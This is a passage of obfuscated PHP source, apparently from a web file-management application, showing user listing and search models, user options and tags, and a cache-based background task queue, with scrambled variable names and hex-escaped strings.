= $this->getInfoSimple($Çõü·ñé); if (!$œ…ºÓôÁ || !$ú§ì©Í¼) { return !1; } $çöïğø¦ = array($¿°¹[1681] => $Çõü·ñé, $¿°¹[1976] => $ú§ì©Í¼); return Model($¿°¹[1978])->where($çöïğø¦)->delete(); } public function listData() { $–»ŞÉÃ¡ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($–»ŞÉÃ¡[$_SERVER[ •ŒÓîÆ][424]]); return $–»ŞÉÃ¡; } public function listByID($¶“ùÃ¼) { $Âƒ­Ğ÷¥ =& $_SERVER[ •ŒÓîÆ]; if (!$¶“ùÃ¼) { return; } $´ä¶æÎ = array($Âƒ­Ğ÷¥[1690] => array($Âƒ­Ğ÷¥[7], $¶“ùÃ¼)); $£ËÍœÙ“ = $this->where($´ä¶æÎ)->select(); $£ËÍœÙ“ = array_sort_keep($£ËÍœÙ“, $Âƒ­Ğ÷¥[1690], $¶“ùÃ¼); $this->_listDataApply($£ËÍœÙ“); return $£ËÍœÙ“; } public function listByGroup($Íëá“í” = 0, $Ğ¼µ‚Â‹ = array()) { $¯¶°ĞÂ† =& $_SERVER[ •ŒÓîÆ]; $’Ï¸¥¡ş = $¯¶°ĞÂ†[12]; $„®¼Ûå = array(); if ($Íëá“í”) { $„®¼Ûå = array($¯¶°ĞÂ†[2376] => intval($Íëá“í”)); $’Ï¸¥¡ş = "\114\105\x46\x54\40\x4a\x4f\111\116\x20{$this->tablePrefix}\165\x73\145\162\x5f\147\x72\x6f\165\x70\40\x75\163\145\162\x5f\147\162\157\165\160\x20\157\x6e\40\x75\163\145\x72\56\x75\x73\x65\162\111\x44\x20\x3d\40\x75\163\145\x72\x5f\147\162\157\x75\160\56\x75\163\x65\x72\x49\x44"; $¨ÆÁõ£Ğ = Input::get($¯¶°ĞÂ†[509], null, $¯¶°ĞÂ†[12]) ? $¯¶°ĞÂ†[12] : $¯¶°ĞÂ†[2377]; } if (isset($Ğ¼µ‚Â‹[$¯¶°ĞÂ†[791]])) { $„®¼Ûå[$¯¶°ĞÂ†[2378]] = $Ğ¼µ‚Â‹[$¯¶°ĞÂ†[791]]; } $Ü­¼é‰ó = $this->_makeOrder($¨ÆÁõ£Ğ)->field($¯¶°ĞÂ†[2379])->where($„®¼Ûå)->join($’Ï¸¥¡ş)->selectPage(50); $this->_listDataApply($Ü­¼é‰ó[$¯¶°ĞÂ†[424]]); return $Ü­¼é‰ó; } private function _makeOrder($ãÁ‚Ü«› = '') { $¢Ù“ ÔÆ =& $_SERVER[ •ŒÓîÆ]; $„¾™îŞê = array($¢Ù“ ÔÆ[1690], $¢Ù“ ÔÆ[32], $¢Ù“ ÔÆ[1877], $¢Ù“ ÔÆ[1849], $¢Ù“ ÔÆ[217]); $œÏ±Œ“ù = array($¢Ù“ ÔÆ[502] => $¢Ù“ ÔÆ[503], $¢Ù“ ÔÆ[504] => $¢Ù“ ÔÆ[505]); $˜«ÌÌÆ = Input::get($¢Ù“ ÔÆ[509], $¢Ù“ ÔÆ[7], $¢Ù“ ÔÆ[1681], $„¾™îŞê); $¾İ¹¦õ• = Input::get($¢Ù“ ÔÆ[510], $¢Ù“ ÔÆ[7], $¢Ù“ ÔÆ[1979], array($¢Ù“ ÔÆ[1979], $¢Ù“ ÔÆ[504])); $¾İ¹¦õ• = $œÏ±Œ“ù[$¾İ¹¦õ•]; $ãÁ‚Ü«› = $ãÁ‚Ü«› . "\x75\x73\145\162\x2e{$˜«ÌÌÆ}\40{$¾İ¹¦õ•}\x2c\x20\165\163\x65\162\56\165\x73\x65\162\111\104\40\x61\x73\143"; return $this->alias($¢Ù“ ÔÆ[2105])->order($ãÁ‚Ü«›); } public function listSearch($Ô§ ßşÛ) { $Šˆ¢‹İü =& $_SERVER[ •ŒÓîÆ]; $ıƒ³¹­ñ = $Ô§ ßşÛ[$Šˆ¢‹İü[1982]]; $Ã«ª‰öê = isset($Ô§ ßşÛ[$Šˆ¢‹İü[1983]]) ? $Ô§ ßşÛ[$Šˆ¢‹İü[1983]] : !1; $ıƒ³¹­ñ = str_replace($Šˆ¢‹İü[1984], $Šˆ¢‹İü[1985], trim($ıƒ³¹­ñ)); $¤°Òİ™‘ = array($Šˆ¢‹İü[32] => array($Šˆ¢‹İü[437], "\x25{$ıƒ³¹­ñ}\45"), $Šˆ¢‹İü[360] => array($Šˆ¢‹İü[437], "{$ıƒ³¹­ñ}\x25"), $Šˆ¢‹İü[2170] => array($Šˆ¢‹İü[437], "{$ıƒ³¹­ñ}\x25"), $Šˆ¢‹İü[1041] => $Šˆ¢‹İü[1986]); if (Input::check($ıƒ³¹­ñ, $Šˆ¢‹İü[366])) { $¤°Òİ™‘[$Šˆ¢‹İü[1690]] = array($Šˆ¢‹İü[437], "{$ıƒ³¹­ñ}\x25"); $¤°Òİ™‘[$Šˆ¢‹İü[2361]] = array($Šˆ¢‹İü[437], "{$ıƒ³¹­ñ}\x25"); } if (!$ıƒ³¹­ñ) { $¤°Òİ™‘ = array(); } if (isset($Ô§ ßşÛ[$Šˆ¢‹İü[791]])) { $¤°Òİ™‘[$Šˆ¢‹İü[791]] = $Ô§ ßşÛ[$Šˆ¢‹İü[791]]; } $¤°Òİ™‘ = $this->parseWhereLike($¤°Òİ™‘); $ÎÉÛ«êÑ = $this->_makeOrder()->where($¤°Òİ™‘)->selectPage(20); if (!$ÎÉÛ«êÑ || count($ÎÉÛ«êÑ[$Šˆ¢‹İü[424]]) < 5 && Input::check($ıƒ³¹­ñ, $Šˆ¢‹İü[373])) { $§’£±Äü = $this->_searchFromMeta($Šˆ¢‹İü[516], $ıƒ³¹­ñ, 10); $‹ËãÇÅ = $this->_searchFromMeta($Šˆ¢‹İü[517], $ıƒ³¹­ñ, 10); $Øª˜İ—­ = array_merge($§’£±Äü, $‹ËãÇÅ, $ÎÉÛ«êÑ[$Šˆ¢‹İü[424]]); $ÎÉÛ«êÑ[$Šˆ¢‹İü[424]] = array_unique_by_key($Øª˜İ—­, $Šˆ¢‹İü[1690]); $ÎÉÛ«êÑ[$Šˆ¢‹İü[421]][$Šˆ¢‹İü[422]] = count($ÎÉÛ«êÑ[$Šˆ¢‹İü[424]]); $ÎÉÛ«êÑ[$Šˆ¢‹İü[421]][$Šˆ¢‹İü[423]] = ceil($ÎÉÛ«êÑ[$Šˆ¢‹İü[421]][$Šˆ¢‹İü[422]] / $ÎÉÛ«êÑ[$Šˆ¢‹İü[421]][$Šˆ¢‹İü[418]]); } $this->_listDataApply($ÎÉÛ«êÑ[$Šˆ¢‹İü[424]]); $this->_filterByGroup($ÎÉÛ«êÑ, $Ã«ª‰öê); return $ÎÉÛ«êÑ; } private function _filterByGroup(&$óùÌó, $öÁãò÷‚) { $ˆ “­² =& $_SERVER[ •ŒÓîÆ]; if (!$öÁãò÷‚) { return $óùÌó; } foreach ($óùÌó[$ˆ “­²[424]] as $éí˜ûíå => &$•øìÓñ) { $×…“œÏ = array_to_keyvalue($•øìÓñ[$ˆ “­²[2075]], $ˆ “­²[12], $ˆ “­²[1888]); if (!in_array($öÁãò÷‚, $×…“œÏ)) { unset($óùÌó[$ˆ “­²[424]][$éí˜ûíå]); } } unset($•øìÓñ); $óùÌó[$ˆ “­²[424]] = array_values($óùÌó[$ˆ “­²[424]]); $óùÌó[$ˆ “­²[421]] = array($ˆ “­²[2140] => count($óùÌó[$ˆ “­²[424]]), $ˆ “­²[2138] => $óùÌó[$ˆ “­²[421]][$ˆ “­²[418]], $ˆ “­²[2137] => 1, $ˆ “­²[2139] => 1); } private function _searchFromMeta($î€¼Ø¤„, $á÷ùñ‚, $ÜÜëÑ³”) { $°ËŞµô• =& $_SERVER[ •ŒÓîÆ]; $á÷ùñ‚ = strtolower($á÷ùñ‚); $íÅÛóÃ´ = array($°ËŞµô•[96] => $î€¼Ø¤„, $°ËŞµô•[429] => array($°ËŞµô•[437], "\x25{$á÷ùñ‚}\45")); $íÅÛóÃ´ = $this->parseWhereLike($íÅÛóÃ´); $å§ ¥Èû = Model($°ËŞµô•[2380])->where($íÅÛóÃ´)->limit($ÜÜëÑ³”)->select(); if (!$å§ ¥Èû) { return array(); } $å§ ¥Èû = array_to_keyvalue($å§ ¥Èû, $°ËŞµô•[12], $°ËŞµô•[1690]); $ê¨‹Ìù = $this->where(array($°ËŞµô•[1681] => array($°ËŞµô•[7], $å§ ¥Èû)))->select(); if (!$ê¨‹Ìù) { return array(); } return $ê¨‹Ìù; } private function _listDataApplyItem($ß™ŸÈ°—) { $ì…„á³¸ = array($ß™ŸÈ°—); $this->_listDataApply($ì…„á³¸); return $ì…„á³¸[0]; } private function _listDataApply(&$»•ºã°«) { $œÀüŒ»ú =& $_SERVER[ •ŒÓîÆ]; if (!$»•ºã°«) { return; } array_remove_key($»•ºã°«, $œÀüŒ»ú[930]); $äï¼Õ„ª = array_to_keyvalue($»•ºã°«, $œÀüŒ»ú[12], $œÀüŒ»ú[1690]); $this->_listAppendGroup($»•ºã°«, $äï¼Õ„ª); $this->_listAppendMeta($»•ºã°«, $äï¼Õ„ª); $this->_listAppendSourceRoot($»•ºã°«, $äï¼Õ„ª); } private function _listAppendSourceRoot(&$Õ‰‰‘ü, $öÄÕ˜º ) { $Ú––µé =& $_SERVER[ •ŒÓîÆ]; $¼½êÑ¹ = Model($Ú––µé[866])->listSourceRoot(SourceModel::TYPE_USER, $öÄÕ˜º ); $¼½êÑ¹ = array_to_keyvalue($¼½êÑ¹, $Ú––µé[550]); $¼½êÑ¹ = array_remove_key($¼½êÑ¹, $Ú––µé[550]); foreach ($Õ‰‰‘ü as &$–«´îøÙ) { $–«´îøÙ[$Ú––µé[89]] = $¼½êÑ¹[$–«´îøÙ[$Ú––µé[1690]]] ? $¼½êÑ¹[$–«´îøÙ[$Ú––µé[1690]]] : array(); } unset($–«´îøÙ); } private function _listAppendGroup(&$¸Â¾€¾, $¬äì£ÌÉ) { $­Ï‰Ã¬Ó =& $_SERVER[ •ŒÓîÆ]; $Ê¾‘¢ò¡ = array($­Ï‰Ã¬Ó[1690] => array($­Ï‰Ã¬Ó[7], $¬äì£ÌÉ)); $Ñ´¤‘ø› = Model($­Ï‰Ã¬Ó[1978])->where($Ê¾‘¢ò¡)->select(); $Ú¾ØŸ¿ = array_to_keyvalue($Ñ´¤‘ø›, $­Ï‰Ã¬Ó[12], $­Ï‰Ã¬Ó[1888]); $Ú¾ØŸ¿ = array_remove_value(array_unique($Ú¾ØŸ¿), $­Ï‰Ã¬Ó[214]); if (!$Ú¾ØŸ¿ || !$Ñ´¤‘ø›) { return; } $Ê¾‘¢ò¡ = array($­Ï‰Ã¬Ó[1888] => array($­Ï‰Ã¬Ó[7], $Ú¾ØŸ¿)); $Áê­ÆŒò = Model($­Ï‰Ã¬Ó[2073])->field($­Ï‰Ã¬Ó[2381])->where($Ê¾‘¢ò¡)->select(); $Áê­ÆŒò = array_to_keyvalue($Áê­ÆŒò, $­Ï‰Ã¬Ó[1888]); $Ñ´¤‘ø› = array_to_keyvalue_group($Ñ´¤‘ø›, $­Ï‰Ã¬Ó[1690]); foreach ($Ñ´¤‘ø› as &$®Ä”Ù›‡) { $Š²ªòÙ  = array(); foreach ($®Ä”Ù›‡ as $­Á³ûè) { if (!$­Á³ûè[$­Ï‰Ã¬Ó[1992]]) { continue; } $¨«ıÎ”è = Model($­Ï‰Ã¬Ó[552])->listData($­Á³ûè[$­Ï‰Ã¬Ó[1992]]); $Š²ªòÙ [] = array($­Ï‰Ã¬Ó[1888] => $­Á³ûè[$­Ï‰Ã¬Ó[1888]], $­Ï‰Ã¬Ó[2382] => $Áê­ÆŒò[$­Á³ûè[$­Ï‰Ã¬Ó[1888]]][$­Ï‰Ã¬Ó[32]], $­Ï‰Ã¬Ó[565] => $Áê­ÆŒò[$­Á³ûè[$­Ï‰Ã¬Ó[1888]]][$­Ï‰Ã¬Ó[565]], $­Ï‰Ã¬Ó[466] => $¨«ıÎ”è); } $®Ä”Ù›‡ = $Š²ªòÙ ; } unset($®Ä”Ù›‡); foreach ($¸Â¾€¾ as &$İ€Óş) { $İ€Óş[$­Ï‰Ã¬Ó[2075]] = array(); if (isset($Ñ´¤‘ø›[$İ€Óş[$­Ï‰Ã¬Ó[1690]]])) { $İ€Óş[$­Ï‰Ã¬Ó[2075]] = $Ñ´¤‘ø›[$İ€Óş[$­Ï‰Ã¬Ó[1690]]]; } } unset($İ€Óş); } public function userAppendGroup($‡Úäû»õ) { $Õ´Íªú½ =& $_SERVER[ •ŒÓîÆ]; if (!$‡Úäû»õ) { return array(); } $this->_listAppendGroup($‡Úäû»õ, array_to_keyvalue($‡Úäû»õ, $Õ´Íªú½[12], $Õ´Íªú½[1690])); return $‡Úäû»õ; } private function _listAppendMeta(&$¬ù²’Ãå, $Š°‹˜ï£) { $Ò‘çÛüÒ =& $_SERVER[ •ŒÓîÆ]; $¾ÊûŠò› = UserJobModel::JOB_KEY; $ş›ñ’× = array($Ò‘çÛüÒ[2362]); $Ò½â£ê = array($Ò‘çÛüÒ[1690] => array($Ò‘çÛüÒ[7], $Š°‹˜ï£)); $¨“–í§¼ = Model($Ò‘çÛüÒ[2360])->where($Ò½â£ê)->select(); $¨“–í§¼ = array_to_keyvalue_group($¨“–í§¼, $Ò‘çÛüÒ[1690]); foreach ($¨“–í§¼ as &$Œ’õª­ğ) { $¡Ò”Ó© = array(); foreach ($Œ’õª­ğ as $ì¾×ÎïÀ) { if (!in_array($ì¾×ÎïÀ[$Ò‘çÛüÒ[96]], $ş›ñ’×)) { $¡Ò”Ó©[$ì¾×ÎïÀ[$Ò‘çÛüÒ[96]]] = $ì¾×ÎïÀ[$Ò‘çÛüÒ[429]]; } } $Œ’õª­ğ = $¡Ò”Ó©; } unset($Œ’õª­ğ); $áÛàÙ± = Model($Ò‘çÛüÒ[2383]); foreach ($¬ù²’Ãå as &$Ìøø¥ğ¦) { $×©ĞÕÕÊ = array(); if (isset($¨“–í§¼[$Ìøø¥ğ¦[$Ò‘çÛüÒ[1690]]])) { $×©ĞÕÕÊ = $¨“–í§¼[$Ìøø¥ğ¦[$Ò‘çÛüÒ[1690]]]; } $Ìøø¥ğ¦[$Ò‘çÛüÒ[2384]] = array(); if (isset($×©ĞÕÕÊ[$¾ÊûŠò›])) { $Ìøø¥ğ¦[$Ò‘çÛüÒ[2384]] = $áÛàÙ±->getUserJobInfo($×©ĞÕÕÊ[$¾ÊûŠò›]); } } unset($Ìøø¥ğ¦); } protected function groupUserAll($÷ŒÓË˜È) { $ñ“Õ–É¨ =& $_SERVER[ •ŒÓîÆ]; if (!$÷ŒÓË˜È) { return !1; } $Œ•—Øîü = Model($ñ“Õ–É¨[1978])->field($ñ“Õ–É¨[1690])->where(array($ñ“Õ–É¨[1888] => array($ñ“Õ–É¨[7], $÷ŒÓË˜È)))->select(); $Œ•—Øîü = array_to_keyvalue($Œ•—Øîü, $ñ“Õ–É¨[12], $ñ“Õ–É¨[1690]); return array_unique($Œ•—Øîü); } public function userSearch($™ã˜›¥¿, $¡ğÓ†İĞ = "\52") { return Model($_SERVER[ •ŒÓîÆ][579])->where($™ã˜›¥¿)->field($¡ğÓ†İĞ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\137\x6f\160\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($«­İªƒ») { $ë‚£€¬ =& $_SERVER[ •ŒÓîÆ]; $·£‰×˜ = defined($ë‚£€¬[2109]) && USER_ID ? USER_ID : $ë‚£€¬[12]; return "\125\163\145\162\117\160\x74\151\157\156\x5f{$«­İªƒ»}\x5f" . $·£‰×˜; } protected function filterWhere($øåÆ£¢Ä) { $“×ïÏˆ‘ =& $_SERVER[ •ŒÓîÆ]; $øåÆ£¢Ä[$“×ïÏˆ‘[1690]] = defined($“×ïÏˆ‘[2109]) && USER_ID ? USER_ID : $“×ïÏˆ‘[12]; return $øåÆ£¢Ä; } public function cacheRemoveUser($À›ÀôÜî, $ıµ‘¹›¿) { return Cache::remove("\125\163\x65\x72\117\x70\x74\151\157\156\137{$À›ÀôÜî}\x5f" . $ıµ‘¹›¿); } protected function optionDefault($„ª¥£ù¸ = '') { $¾Áï¡·È =& $_SERVER[ •ŒÓîÆ]; if ($„ª¥£ù¸ == $¾Áï¡·È[12]) { return $GLOBALS[$¾Áï¡·È[6]][$¾Áï¡·È[2385]]; } if ($„ª¥£ù¸ == $¾Áï¡·È[2386]) { return $GLOBALS[$¾Áï¡·È[6]][$¾Áï¡·È[2387]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\x2e\164\141\x67\114\x69\x73\x74"; public $modelType = "\125\163\x65\x72\x4f\x70\164\x69\x6f\156"; public $field = array("\x6e\x61\x6d\x65", "\163\164\171\154\x65", "\x73\x6f\x72\x74"); public function listData($ê€ë ¿ = false, $«¾›”Ş = "\x73\157\x72\x74", $ÓœŠ—³Š = false) { return parent::listData($ê€ë ¿, $«¾›”Ş, $ÓœŠ—³Š); } public function remove($•ÏâÇÜÚ) { return parent::remove($•ÏâÇÜÚ); } public function add($û°ä¾, $‚åµ»ÑÏ = "\x6c\x61\x62\145\x6c\55\x67\162\x65\x79\55\156\x6f\162\x6d\x61\x6c") { $†à€ö =& $_SERVER[ •ŒÓîÆ]; if ($this->findByName($û°ä¾)) { return !1; } $Ğş“‡» = array($†à€ö[473] => $û°ä¾, $†à€ö[538] => $‚åµ»ÑÏ, $†à€ö[1892] => $this->getSort($†à€ö[313]) + 1); return parent::insert($Ğş“‡»); } public function update($ó­ášß, $ø—‰ãĞ„) { $Ñ‘öºŸŸ =& $_SERVER[ •ŒÓîÆ]; $¼œ”ÉÅ¯ = $this->listData($ó­ášß); $øœÚ˜ï = $this->findByName($ø—‰ãĞ„[$Ñ‘öºŸŸ[32]]); if (!$¼œ”ÉÅ¯ || $øœÚ˜ï && $øœÚ˜ï[$Ñ‘öºŸŸ[453]] != $¼œ”ÉÅ¯[$Ñ‘öºŸŸ[453]]) { return !1; } return parent::update($ó­ášß, $ø—‰ãĞ„); } public function moveTop($öøÏ—¼†) { $•¾óÊ· =& $_SERVER[ •ŒÓîÆ]; $âÒÌ¸…¦ = parent::listData(); $¥ñâ÷úÆ = $this->getSort($•¾óÊ·[312]); foreach ($âÒÌ¸…¦ as &$·æÜòãŞ) { if ($·æÜòãŞ[$•¾óÊ·[453]] == $öøÏ—¼†) { $·æÜòãŞ[$•¾óÊ·[1912]] = $¥ñâ÷úÆ; continue; } $·æÜòãŞ[$•¾óÊ·[1912]] += 1; } unset($·æÜòãŞ); return parent::resetData($âÒÌ¸…¦); } public function moveBottom($¼§·µÉ”) { $‰îæ±à =& $_SERVER[ •ŒÓîÆ]; $–¡„¸á = $this->getSort($‰îæ±à[313]) + 1; return parent::update($¼§·µÉ”, array($‰îæ±à[1912] => $–¡„¸á)); } public function resetSort($àÄ¶ô×®) { $ƒòõ§ƒ =& $_SERVER[ •ŒÓîÆ]; $¢ƒÖ¸™Ò = array(); $àÄ¶ô×® = is_array($àÄ¶ô×®) ? $àÄ¶ô×® : array(); for ($»ùÆ÷ù³ = 0; $»ùÆ÷ù³ < count($àÄ¶ô×®); $»ùÆ÷ù³++) { $¢ƒÖ¸™Ò[$àÄ¶ô×®[$»ùÆ÷ù³] . $ƒòõ§ƒ[12]] = $»ùÆ÷ù³ + 1; } $ÅğòéÅ« = parent::listData(); foreach ($ÅğòéÅ« as &$›íÙ£óì) { $‚È¨ÜÍæ = $¢ƒÖ¸™Ò[$›íÙ£óì[$ƒòõ§ƒ[453]]]; $›íÙ£óì[$ƒòõ§ƒ[1912]] = $‚È¨ÜÍæ ? $‚È¨ÜÍæ : $›íÙ£óì[$ƒòõ§ƒ[1912]]; } unset($›íÙ£óì); return parent::resetData($ÅğòéÅ«); } private function getSort($²ƒÁù¤ë) { $Î€Ş•£ =& $_SERVER[ •ŒÓîÆ]; $Ùú»ç³Ô = parent::listData(); $ËÁı¬Šé = array_to_keyvalue($Ùú»ç³Ô, $Î€Ş•£[12], $Î€Ş•£[1912]); if (!$ËÁı¬Šé) { $ËÁı¬Šé = array(0); } $¦”Ü¿Œû = $²ƒÁù¤ë == $Î€Ş•£[313] ? max($ËÁı¬Šé) : min($ËÁı¬Šé); return intval($¦”Ü¿Œû); } } goto Dâï·•îĞ; c„«›œ›À£: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\153\x51\x75\x65\165\x65\x4c\x65\x6e\147\x74\150"; const QUEUE_DATA = "\164\x61\x73\153\121\165\145\165\x65\x44\x61\x74\x61"; const QUEUE_TIME = "\x74\141\x73\153\x51\x75\x65\165\x65\x4c\141\163\164\122\x75\156"; const QUEUE_THREAD = "\x74\141\x73\153\x51\x75\x65\x75\145\124\x68\162\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($”¨ıä–», $ÛÔö‹ã¨ = array(), $”Å©€¿„ = '', $½‰ÔÀõ = '') { $ö¨·É°ß =& $_SERVER[ •ŒÓîÆ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($½‰ÔÀõ && array_find_by_field(self::$listData, $ö¨·É°ß[96], $½‰ÔÀõ)) { return !0; } if ($½‰ÔÀõ && array_find_by_field(self::$listDataAdd, $ö¨·É°ß[96], $½‰ÔÀõ)) { return !0; } self::$listDataAdd[] = array($ö¨·É°ß[319] => $”¨ıä–», $ö¨·É°ß[1788] => $ÛÔö‹ã¨, $ö¨·É°ß[505] => $”Å©€¿„, $ö¨·É°ß[96] => $½‰ÔÀõ); return !0; } public static function addSubmit() { $µŞ£Ø”‡ =& $_SERVER[ •ŒÓîÆ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($µŞ£Ø”‡[1789] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $µŞ£Ø”‡[12], $µŞ£Ø”‡[505])), $µŞ£Ø”‡[187]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ö„Ùù¯, $ÉƒÉ¯Õª = array(), $µŞ˜”Æ = '', $œÀôô Ô = '') { $ìô¡¹‹© =& $_SERVER[ •ŒÓîÆ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $—È»¸óİ = self::getAll(); if ($œÀôô Ô && array_find_by_field($—È»¸óİ, $ìô¡¹‹©[96], $œÀôô Ô)) { return !0; } $—È»¸óİ[] = array($ìô¡¹‹©[319] => $ö„Ùù¯, $ìô¡¹‹©[1788] => $ÉƒÉ¯Õª, $ìô¡¹‹©[505] => $µŞ˜”Æ, $ìô¡¹‹©[96] => $œÀôô Ô); self::setAll($—È»¸óİ); write_log($ìô¡¹‹©[1789] . $µŞ˜”Æ, $ìô¡¹‹©[187]); return !0; } public static function run() { $·ÀÂ Û =& $_SERVER[ •ŒÓîÆ]; $Õ¯Îô™ = self::getAll(); $óÆ°ñ±ì = array_shift($Õ¯Îô™); if (!$óÆ°ñ±ì) { return !1; } self::setAll($Õ¯Îô™); $İ€»Ô¦¾ = timeFloat(); $˜¹¬šĞ = $·ÀÂ Û[12]; try { $˜¹¬šĞ = Hook::apply($óÆ°ñ±ì[$·ÀÂ Û[319]], $óÆ°ñ±ì[$·ÀÂ Û[1788]]); } catch (Exception $Õö­•ÄŒ) { write_log($Õö­•ÄŒ, $·ÀÂ Û[1223]); } $öñ´İ ï = number_format(timeFloat() - $İ€»Ô¦¾, 3) . $·ÀÂ Û[1706]; if ($˜¹¬šĞ && is_string($˜¹¬šĞ)) { $öñ´İ ï = $öñ´İ ï . $·ÀÂ Û[1790] . $˜¹¬šĞ; } write_log($·ÀÂ Û[1791] . $óÆ°ñ±ì[$·ÀÂ Û[505]] . $·ÀÂ Û[1792] . $öñ´İ ï, $·ÀÂ Û[187]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ãö¢ñË´ =& $_SERVER[ •ŒÓîÆ]; $¢íì ½ = self::threadCount() + 1; if ($¢íì ½ > 3 || !self::count()) { return; } write_log($Ãö¢ñË´[1793] . $¢íì ½, $Ãö¢ñË´[187]); Cache::set(self::QUEUE_THREAD, $¢íì ½, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ãö¢ñË´[1794], $Ãö¢ñË´[187]); } public static function getKey($ø¬Àõ§’, $‡ÛÒÎ“ = "\x69\x6e\164") { $’–§½ =& $_SERVER[ •ŒÓîÆ]; Cache::removeMemory($ø¬Àõ§’); $˜¿á¨±® = Cache::get($ø¬Àõ§’); if ($‡ÛÒÎ“ == $’–§½[343]) { return $˜¿á¨±® ? intval($˜¿á¨±®) : 0; } if ($‡ÛÒÎ“ == $’–§½[1795]) { return is_array($˜¿á¨±®) ? $˜¿á¨±® : array(); } return $˜¿á¨±®; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ •ŒÓîÆ][1795]); } public static function setAll($©²Òµ‘) { $»ôğ±ÓÃ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($©²Òµ‘), $»ôğ±ÓÃ); Cache::set(self::QUEUE_DATA, $©²Òµ‘, $»ôğ±ÓÃ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($šûİ¶¾ã, $ÕÂØÒúı = 5.0) { if (!$šûİ¶¾ã) { return; } $ë‘Èæô¥ = Cache::get($šûİ¶¾ã); if (!$ë‘Èæô¥ || timeFloat() - floatVal($ë‘Èæô¥) >= $ÕÂØÒúı) { Cache::set($šûİ¶¾ã, timeFloat(), $ÕÂØÒúı * 10); return !0; } return !1; } public static function timeLimitCall($şÃ½”¨Û, $ÂŒû¸Ü„, $ŸûÊ³†¸, $¸Æ… = 5.0) { $ªÎş‹ =& $_SERVER[ •ŒÓîÆ]; if (!$şÃ½”¨Û || !$ÂŒû¸Ü„) { return; } self::$asyncAdd = !0; $ğåê´¿ô = $ªÎş‹[1796]; $ğ½³Ş¤¡ = Cache::get($ğåê´¿ô, !0); $¦âŞçì  = array($ªÎş‹[1797] => timeFloat(), $ªÎş‹[1798] => timeFloat(), $ªÎş‹[319] => $ÂŒû¸Ü„, $ªÎş‹[1788] => $ŸûÊ³†¸, $ªÎş‹[196] => $¸Æ…); if (is_array($ğ½³Ş¤¡[$şÃ½”¨Û])) { $¦âŞçì [$ªÎş‹[1798]] = $ğ½³Ş¤¡[$şÃ½”¨Û][$ªÎş‹[1798]]; } if (is_array($ğ½³Ş¤¡[$şÃ½”¨Û])) { if (timeFloat() - $ğ½³Ş¤¡[$şÃ½”¨Û][$ªÎş‹[1797]] < $¦âŞçì [$ªÎş‹[196]] * 0.3) { return; } $¦âŞçì [$ªÎş‹[1798]] = $ğ½³Ş¤¡[$şÃ½”¨Û][$ªÎş‹[1798]]; } $ğ½³Ş¤¡[$şÃ½”¨Û] = $¦âŞçì ; Cache::set($ğåê´¿ô, $ğ½³Ş¤¡, 60); Cache::removeMemory($ğåê´¿ô); write_log($ªÎş‹[1799] . $şÃ½”¨Û . $ªÎş‹[73] . $ÂŒû¸Ü„, $ªÎş‹[187]); } public static function timeLimitCallLoop() { $í®ö¹º =& $_SERVER[ •ŒÓîÆ]; $İ­„ø¦³ = array($í®ö¹º[1800]); $¨ªÁÛô­ = in_array(strtolower(ACTION), $İ­„ø¦³); if (!$¨ªÁÛô­ && !self::$asyncAdd) { return; } $€ıÍª¼é = $í®ö¹º[1796]; $ÃšØ‡Õ = Cache::get($€ıÍª¼é, !0); if (!$ÃšØ‡Õ || count($ÃšØ‡Õ) <= 0) { return; } $æ‚ÇøñÑ = !1; $´”›°öˆ = timeFloat(); $Ø¦¯±õ© = array(); foreach ($ÃšØ‡Õ as $‚Ù¶µ’´ => $Ìûîş£…) { if ($´”›°öˆ - $Ìûîş£…[$í®ö¹º[1798]] > $Ìûîş£…[$í®ö¹º[196]]) { $æ‚ÇøñÑ = !0; try { Hook::apply($Ìûîş£…[$í®ö¹º[319]], $Ìûîş£…[$í®ö¹º[1788]]); write_log($í®ö¹º[1801] . $‚Ù¶µ’´ . $í®ö¹º[73] . $Ìûîş£…[$í®ö¹º[319]] . $í®ö¹º[1802] . ACTION, $í®ö¹º[187]); } catch (Exception $ÑÏ•øÇ¯) { } continue; } $Ø¦¯±õ©[$‚Ù¶µ’´] = $Ìûîş£…; } if (!$æ‚ÇøñÑ) { return; } if (!$Ø¦¯±õ©) { return Cache::remove($€ıÍª¼é); } Cache::set($€ıÍª¼é, $Ø¦¯±õ©, 60); Cache::removeMemory($€ıÍª¼é); } public static function finished($®šÎÁúÍ, $˜µ™ìá¡) { $ËÀ§§“¤ =& $_SERVER[ •ŒÓîÆ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ËÀ§§“¤[319] => $®šÎÁúÍ, $ËÀ§§“¤[1788] => $˜µ™ìá¡); } private static function finishedRun() { $›€âØºø =& $_SERVER[ •ŒÓîÆ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ó‰µÒÅÄ) { try { Hook::apply($ó‰µÒÅÄ[$›€âØºø[319]], $ó‰µÒÅÄ[$›€âØºø[1788]]); } catch (Exception 